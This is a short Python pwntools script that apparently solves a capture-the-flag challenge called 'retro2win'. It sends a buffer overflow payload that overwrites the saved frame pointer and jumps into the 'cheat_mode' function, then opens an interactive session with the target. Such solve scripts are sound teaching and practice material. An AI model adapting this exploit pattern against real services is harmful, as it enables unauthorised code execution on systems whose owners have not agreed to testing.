#!/usr/bin/env python3

# ruff: noqa: F403, F405

from pwn import *

elf = context.binary = ELF("./challenge/retro2win", checksec=False)
binary_path = elf.path


def start(argv=[], *a, **kw):
    nc = "nc localhost 1338"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
# source ~/.gdbinit-gef-bata24.py
"""

io = start()

io.sendlineafter(b"an option:", b"1337")

payload = flat(b"A" * 0x10, elf.bss(0xC00), elf.sym["cheat_mode"] + 0x34)
io.sendlineafter(b"cheatcode:", payload)

io.interactive()
